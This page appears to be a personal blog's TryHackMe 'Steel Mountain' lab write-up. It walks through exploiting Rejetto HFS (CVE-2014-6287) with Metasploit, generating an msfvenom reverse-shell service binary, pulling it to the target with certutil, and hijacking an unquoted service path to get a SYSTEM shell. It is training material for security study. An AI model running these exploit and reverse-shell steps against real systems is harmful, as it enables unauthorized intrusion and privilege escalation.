<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> Steel Mountain | Biscotti Diskette </title> <meta name="author" content="Biscotti Diskette"> <meta name="description" content="Steel Mountain from TryHackMe."> <meta name="keywords" content="jekyll, jekyll-theme, academic-website, portfolio-website"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" href="/assets/css/scholar-icons.css?62b2ac103a88034e6882a5be5f3e2772"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&amp;display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link rel="shortcut icon" href="/assets/img/frontpage/Logo1.png?4f879aeff848659581251777fe0ab074"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://biscottidiskette.github.io/boxes/32_steel_mountain/"> <script src="/assets/js/theme.js?9a0c749ec5240d9cda97bc72359a72c0"></script> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script>
    initTheme();
  </script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> <span class="font-weight-bold">Biscotti</span> Diskette </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about </a> </li> <li class="nav-item "> <a class="nav-link" href="/projects/">projects </a> </li> <li class="nav-item active"> <a class="nav-link" href="/boxes/">boxes <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/certifications/">certs </a> </li> <li class="nav-item "> <a class="nav-link" href="/bounties/">bounties </a> </li> <li class="nav-item "> <a class="nav-link" href="/cves/">cves </a> </li> <li class="nav-item "> <a class="nav-link" href="/presentations/">talks </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repos </a> </li> <li class="nav-item "> <a class="nav-link" href="/publications/">publications </a> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="ti ti-sun-moon" id="light-toggle-system"></i> <i class="ti ti-moon-filled" id="light-toggle-dark"></i> <i class="ti ti-sun-filled" id="light-toggle-light"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="post"> <header class="post-header"> <h1 class="post-title">Steel Mountain</h1> <p class="post-description">Steel Mountain from TryHackMe.</p> </header> <article> <div class="row justify-content-sm-center"> <div class="col-sm-4 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/steelmountain/logo.jpeg" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="THM Steel Mountain Logo" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <h2>Link</h2> <p><a href="https://tryhackme.com/room/steelmountain" rel="external nofollow noopener" target="_blank">Room Link</a></p> <p><br></p> <h2>Process</h2> <p><br> Time to climb up the mountain of Mr. Robot.</p> <p>Run nmap to get a list of the services running.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ip-10-10-30-38:~/Rooms/steelmountain# nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-A</span> <span class="nt">-O</span> <span class="nt">-oN</span> nmap 10.10.109.201
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-02-25 11:25 GMT
Nmap scan report <span class="k">for </span>10.10.109.201
Host is up <span class="o">(</span>0.00040s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 988 closed ports
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesn<span class="s1">'t have a title (text/html).
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2025-02-25T11:26:24+00:00; 0s from scanner time.
8080/tcp  open  http               HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /

&lt;snip&gt;
</span></code></pre></div></div> <p><br> Run curl -I to pull the headers to try and fingerprint the technology.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ip-10-10-30-38:~/Rooms/steelmountain# curl <span class="nt">-I</span> http://10.10.109.201
HTTP/1.1 200 OK
Content-Length: 772
Content-Type: text/html
Last-Modified: Fri, 27 Sep 2019 13:07:11 GMT
Accept-Ranges: bytes
ETag: <span class="s2">"9736bb793475d51:0"</span>
Server: Microsoft-IIS/8.5
Date: Tue, 25 Feb 2025 11:36:27 GMT
</code></pre></div></div> <p><br> Check the Landing Page of the website.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/steelmountain/landing.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Landing Page" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> View the source code looking for anything interesting.</p> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>view-source:http://10.10.109.201/

<span class="cp">&lt;!doctype html&gt;</span>
<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
<span class="nt">&lt;head&gt;</span>
  <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"utf-8"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;title&gt;</span>Steel Mountain<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;style&gt;</span>
<span class="o">*</span> <span class="p">{</span><span class="nl">font-family</span><span class="p">:</span> <span class="n">Arial</span><span class="p">;}</span>
<span class="nt">&lt;/style&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;&lt;center&gt;</span>
<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"index.html"</span><span class="nt">&gt;&lt;img</span> <span class="na">src=</span><span class="s">"/img/logo.png"</span> <span class="na">style=</span><span class="s">"width:500px;height:300px;"</span><span class="nt">/&gt;&lt;/a&gt;</span>
<span class="nt">&lt;h3&gt;</span>Employee of the month<span class="nt">&lt;/h3&gt;</span>
<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"/img/BillHarper.png"</span> <span class="na">style=</span><span class="s">"width:200px;height:200px;"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;/center&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div> <p><br> Reviewing the nmap results, search for the HttpFileServer httpd 2.3.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/steelmountain/google.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Google It" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Run msfconsole. The q option suppresses the ASCII art. Search for the CVE indicated in the Google search. There was only one result and chose to use that option. Show the options for that exploit. Set the rhosts and rport options. Since I am using the provided Attack Box, I don’t need lport. Use exploit to launch the exploit and get the meterpreter response.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ip-10-10-30-38:~/Rooms/steelmountainmsfconsole <span class="nt">-q</span>
This copy of metasploit-framework is more than two weeks old.
 Consider running <span class="s1">'msfupdate'</span> to update to the latest version.
msf6 <span class="o">&gt;</span> search cve-2014-6287

Matching Modules
<span class="o">================</span>

   <span class="c">#  Name                                   Disclosure Date  Rank       Check  Description</span>
   -  <span class="nt">----</span>                                   <span class="nt">---------------</span>  <span class="nt">----</span>       <span class="nt">-----</span>  <span class="nt">-----------</span>
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec

msf6 <span class="o">&gt;</span> use exploit/windows/http/rejetto_hfs_exec
<span class="o">[</span><span class="k">*</span><span class="o">]</span> No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit<span class="o">(</span>windows/http/rejetto_hfs_exec<span class="o">)</span> <span class="o">&gt;</span> show options

Module options <span class="o">(</span>exploit/windows/http/rejetto_hfs_exec<span class="o">)</span>:

   Name       Current Setting  Required  Description
   <span class="nt">----</span>       <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
   HTTPDELAY  10               no        Seconds to <span class="nb">wait </span>before terminating web server
   Proxies                     no        A proxy chain of format <span class="nb">type</span>:host:port[,type:host:port][...]
   RHOSTS                      <span class="nb">yes       </span>The target host<span class="o">(</span>s<span class="o">)</span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               <span class="nb">yes       </span>The target port <span class="o">(</span>TCP<span class="o">)</span>
   SRVHOST    0.0.0.0          <span class="nb">yes       </span>The <span class="nb">local </span>host or network interface to listen on. This must be an address on the <span class="nb">local </span>machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             <span class="nb">yes       </span>The <span class="nb">local </span>port to listen on.
   SSL        <span class="nb">false            </span>no        Negotiate SSL/TLS <span class="k">for </span>outgoing connections
   SSLCert                     no        Path to a custom SSL certificate <span class="o">(</span>default is randomly generated<span class="o">)</span>
   TARGETURI  /                <span class="nb">yes       </span>The path of the web application
   URIPATH                     no        The URI to use <span class="k">for </span>this exploit <span class="o">(</span>default is random<span class="o">)</span>
   VHOST                       no        HTTP server virtual host


Payload options <span class="o">(</span>windows/meterpreter/reverse_tcp<span class="o">)</span>:

   Name      Current Setting  Required  Description
   <span class="nt">----</span>      <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
   EXITFUNC  process          <span class="nb">yes       </span>Exit technique <span class="o">(</span>Accepted: <span class="s1">''</span>, seh, thread, process, none<span class="o">)</span>
   LHOST     10.10.30.38      <span class="nb">yes       </span>The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
   LPORT     4444             <span class="nb">yes       </span>The listen port


Exploit target:

   Id  Name
   <span class="nt">--</span>  <span class="nt">----</span>
   0   Automatic



View the full module info with the info, or info <span class="nt">-d</span> command.

msf6 exploit<span class="o">(</span>windows/http/rejetto_hfs_exec<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>rhosts 10.10.109.201
rhosts <span class="o">=&gt;</span> 10.10.109.201
msf6 exploit<span class="o">(</span>windows/http/rejetto_hfs_exec<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>rport 8080
rport <span class="o">=&gt;</span> 8080
msf6 exploit<span class="o">(</span>windows/http/rejetto_hfs_exec<span class="o">)</span> <span class="o">&gt;</span> exploit

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.30.38:4444 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using URL: http://10.10.30.38:8080/Rjy6EBr38Okww
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Server started.
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending a malicious request to /
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Payload request received: /Rjy6EBr38Okww
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>177734 bytes<span class="o">)</span> to 10.10.109.201
<span class="o">[!]</span> Tried to delete %TEMP%<span class="se">\j</span>RNniopprkRtO.vbs, unknown result
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 1 opened <span class="o">(</span>10.10.30.38:4444 -&gt; 10.10.109.201:49268<span class="o">)</span> at 2025-02-25 12:17:33 +0000
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Server stopped.

meterpreter <span class="o">&gt;</span> shell
Process 780 created.
Channel 2 created.
Microsoft Windows <span class="o">[</span>Version 6.3.9600]
<span class="o">(</span>c<span class="o">)</span> 2013 Microsoft Corporation. All rights reserved.

C:<span class="se">\U</span>sers<span class="se">\b</span>ill<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\S</span>tart Menu<span class="se">\P</span>rograms<span class="se">\S</span>tartup&gt;
</code></pre></div></div> <p><br> Get the user.txt flag.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\b</span>ill<span class="se">\D</span>esktop&gt;type user.txt
<span class="nb">type </span>user.txt
&lt;redacted&gt;

C:<span class="se">\U</span>sers<span class="se">\b</span>ill<span class="se">\D</span>esktop&gt;ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  <span class="nb">.</span> : eu-west-1.compute.internal
   Link-local IPv6 Address <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : fe80::154e:3c85:c145:2be1%14
   IPv4 Address. <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 10.10.109.201
   Subnet Mask <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 255.255.0.0
   Default Gateway <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 10.10.0.1

Tunnel adapter isatap.eu-west-1.compute.internal:

   Media State <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : Media disconnected
   Connection-specific DNS Suffix  <span class="nb">.</span> : eu-west-1.compute.internal
</code></pre></div></div> <p><br> Download PowerUp.ps1.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ip-10-10-30-38:~/Rooms/steelmountain# wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
<span class="nt">--2025-02-25</span> 12:24:24--  https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
Resolving raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)</span>... 185.199.109.133, 185.199.110.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)</span>|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 600580 <span class="o">(</span>587K<span class="o">)</span> <span class="o">[</span>text/plain]
Saving to: <span class="se">\u</span>2018PowerUp.ps1<span class="se">\u</span>2019

PowerUp.ps1                                          100%[<span class="o">=====================================================================================================================&gt;]</span> 586.50K  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0.007s  

2025-02-25 12:24:24 <span class="o">(</span>85.5 MB/s<span class="o">)</span> - <span class="se">\u</span>2018PowerUp.ps1<span class="se">\u</span>2019 saved <span class="o">[</span>600580/600580]
</code></pre></div></div> <p><br> Upload PowerUp.ps1 to the victim machine.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> upload PowerUp.ps1
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading  : /root/Rooms/steelmountain/PowerUp.ps1 -&gt; PowerUp.ps1
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploaded 586.50 KiB of 586.50 KiB <span class="o">(</span>100.0%<span class="o">)</span>: /root/Rooms/steelmountain/PowerUp.ps1 -&gt; PowerUp.ps1
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Completed  : /root/Rooms/steelmountain/PowerUp.ps1 -&gt; PowerUp.ps1
</code></pre></div></div> <p><br> Load the powershell meterpreter extension and drop into a PowerShell shell.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> load powershell
Loading extension powershell...Success.
meterpreter <span class="o">&gt;</span> powershell_shell
PS <span class="o">&gt;</span>
</code></pre></div></div> <p><br> Run all of the checks a part of the PowerUp script. Look for something with unquoted service path and CanRestart is True.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS <span class="o">&gt;</span> <span class="nb">.</span> .<span class="se">\P</span>owerUp.ps1
PS <span class="o">&gt;</span> Invoke-AllChecks


ServiceName    : AdvancedSystemCareService9
Path           : C:<span class="se">\P</span>rogram Files <span class="o">(</span>x86<span class="o">)</span><span class="se">\I</span>Obit<span class="se">\A</span>dvanced SystemCare<span class="se">\A</span>SCService.exe
ModifiablePath : @<span class="o">{</span><span class="nv">ModifiablePath</span><span class="o">=</span>C:<span class="se">\;</span> <span class="nv">IdentityReference</span><span class="o">=</span>BUILTIN<span class="se">\U</span>sers<span class="p">;</span> <span class="nv">Permissions</span><span class="o">=</span>AppendData/AddSubdirectory<span class="o">}</span>
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary <span class="nt">-Name</span> <span class="s1">'AdvancedSystemCareService9'</span> <span class="nt">-Path</span> &lt;HijackPath&gt;
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

&lt;snip&gt;
</code></pre></div></div> <p><br> Use msfvenom to generate a service executable to replace the executable from the PowerUp results.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ip-10-10-30-38:~/Rooms/steelmountain# msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.30.38 <span class="nv">LPORT</span><span class="o">=</span>9001 <span class="nt">-e</span> x86/shikata_ga_nai <span class="nt">-f</span> exe-service <span class="nt">-o</span> Advanced.exe
<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 <span class="o">(</span><span class="nv">iteration</span><span class="o">=</span>0<span class="o">)</span>
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of exe-service file: 15872 bytes
Saved as: Advanced.exe
root@ip-10-10-30-38:~/Rooms/steelmountain# python3 <span class="nt">-m</span> http.server
Serving HTTP on 0.0.0.0 port 8000 <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
</code></pre></div></div> <p><br> Use certutil.exe to transfer the binary to the victim machine.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS <span class="o">&gt;</span> certutil.exe <span class="nt">-urlcache</span> <span class="nt">-f</span> http://10.10.30.38:8000/Advanced.exe Advanced.exe
<span class="k">****</span>  Online  <span class="k">****</span>
CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.
</code></pre></div></div> <p><br> Start a netcat listener.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ip-10-10-30-38:~/Rooms/steelmountain# nc <span class="nt">-nlvp</span> 9001
Listening on 0.0.0.0 9001
</code></pre></div></div> <p><br> Stop the servic from running. Overwrite the binary in the path indicated. Then restart the binary.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS <span class="o">&gt;</span> Stop-Service <span class="nt">-Name</span> <span class="s2">"AdvancedSystemCareService9"</span>
PS <span class="o">&gt;</span> <span class="nb">cp </span>Advanced.exe <span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogram Files (x86)</span><span class="se">\I</span><span class="s2">Obit</span><span class="se">\A</span><span class="s2">dvanced SystemCare</span><span class="se">\A</span><span class="s2">SCService.exe"</span>
PS <span class="o">&gt;</span> Start-Service <span class="nt">-Name</span> <span class="s2">"AdvancedSystemCareService9"</span>
ERROR: Start-Service : Failed to start service <span class="s1">'Advanced SystemCare Service 9 (AdvancedSystemCareService9)'</span><span class="nb">.</span>
ERROR: At line:1 char:1
ERROR: + Start-Service <span class="nt">-Name</span> <span class="s2">"AdvancedSystemCareService9"</span>
ERROR: + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ERROR:     + CategoryInfo          : OpenError: <span class="o">(</span>System.ServiceProcess.ServiceController:ServiceController<span class="o">)</span> <span class="o">[</span>Start-Service],
ERROR:    ServiceCommandException
ERROR:     + FullyQualifiedErrorId : StartServiceFailed,Microsoft.PowerShell.Commands.StartServiceCommand
ERROR:
</code></pre></div></div> <p><br> Check the listener and catch the shell.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ip-10-10-30-38:~/Rooms/steelmountain# nc <span class="nt">-nlvp</span> 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.109.201 49303
Microsoft Windows <span class="o">[</span>Version 6.3.9600]
<span class="o">(</span>c<span class="o">)</span> 2013 Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div> <p><br> Get the root.txt flag.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;type root.txt
<span class="nb">type </span>root.txt
&lt;redacteds&gt;
C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  <span class="nb">.</span> : eu-west-1.compute.internal
   Link-local IPv6 Address <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : fe80::154e:3c85:c145:2be1%14
   IPv4 Address. <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 10.10.109.201
   Subnet Mask <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 255.255.0.0
   Default Gateway <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 10.10.0.1

Tunnel adapter isatap.eu-west-1.compute.internal:

   Media State <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : Media disconnected
   Connection-specific DNS Suffix  <span class="nb">.</span> : eu-west-1.compute.internal
</code></pre></div></div> <p><br> Lookup the exploit linked in the box description.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/steelmountain/exploitdb.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Exploit-DB" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><a href="https://www.exploit-db.com/exploits/39161" rel="external nofollow noopener" target="_blank">https://www.exploit-db.com/exploits/39161</a></p> <p><br> Download the exploit to the local working folder.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ip-10-10-30-38:~/Rooms/steelmountain# wget https://www.exploit-db.com/raw/39161 <span class="nt">-O</span> exploit.py
<span class="nt">--2025-02-25</span> 12:53:23--  https://www.exploit-db.com/raw/39161
Resolving www.exploit-db.com <span class="o">(</span>www.exploit-db.com<span class="o">)</span>... 192.124.249.13
Connecting to www.exploit-db.com <span class="o">(</span>www.exploit-db.com<span class="o">)</span>|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2515 <span class="o">(</span>2.5K<span class="o">)</span> <span class="o">[</span>text/plain]
Saving to: <span class="se">\u</span>2018exploit.py<span class="se">\u</span>2019

exploit.py                                           100%[<span class="o">=====================================================================================================================&gt;]</span>   2.46K  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0s      

2025-02-25 12:53:23 <span class="o">(</span>339 MB/s<span class="o">)</span> - <span class="se">\u</span>2018exploit.py<span class="se">\u</span>2019 saved <span class="o">[</span>2515/2515]
</code></pre></div></div> <p><br> Copy nc.exe into the local working folder.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ip-10-10-30-38:~/Rooms/steelmountain# <span class="nb">cp</span> <span class="sb">`</span>locate nc.exe<span class="sb">`</span> <span class="nb">.</span>
root@ip-10-10-30-38:~/Rooms/steelmountain# python3 <span class="nt">-m</span> http.server
Serving HTTP on 0.0.0.0 port 8000 <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
</code></pre></div></div> <p><br> Start a netcat listener.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ip-10-10-30-38:~/Rooms/steelmountain# nc <span class="nt">-nlvp</span> 443
Listening on 0.0.0.0 443
</code></pre></div></div> <p><br> Update the script with the ip address and port for the attack.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
# Exploit Title: HttpFileServer 2.3.x Remote Command Execution
# Google Dork: intext:"httpfileserver 2.3"
# Date: 04-01-2016
# Remote: Yes
</span>
<span class="o">&lt;</span><span class="n">snip</span><span class="o">&gt;</span>

    <span class="n">ip_addr</span> <span class="o">=</span> <span class="sh">"</span><span class="s">10.10.30.38</span><span class="sh">"</span> <span class="c1">#local IP address
</span>	<span class="n">local_port</span> <span class="o">=</span> <span class="sh">"</span><span class="s">443</span><span class="sh">"</span> <span class="c1"># Local Port number
</span>
<span class="o">&lt;</span><span class="n">snip</span><span class="o">&gt;</span>
</code></pre></div></div> <p><br> Run the exploit twice. One time transfers the nc.exe to the victim. One time for the exploit.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/thm/steelmountain]
└─<span class="nv">$ </span>python2 exploit.py 10.10.109.201 8080
                                                                                                                                                                                                                                            
┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/thm/steelmountain]
└─<span class="nv">$ </span>python2 exploit.py 10.10.109.201 8080
</code></pre></div></div> <p><br> Check the listener and catch the shell.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/thm/steelmountain]
└─<span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-nlvp</span> 443                         
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali: 
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.4.119.29] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.109.201] 49342
Microsoft Windows <span class="o">[</span>Version 6.3.9600]
<span class="o">(</span>c<span class="o">)</span> 2013 Microsoft Corporation. All rights reserved.

C:<span class="se">\U</span>sers<span class="se">\b</span>ill<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\S</span>tart Menu<span class="se">\P</span>rograms<span class="se">\S</span>tartup&gt;
</code></pre></div></div> <p><br> Download winpeas.exe to the local working folder.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/thm/steelmountain]
└─<span class="nv">$ </span>wget https://github.com/peass-ng/PEASS-ng/releases/download/20250223-a8d560c8/winPEASany.exe <span class="nt">-O</span> winpeas.exe
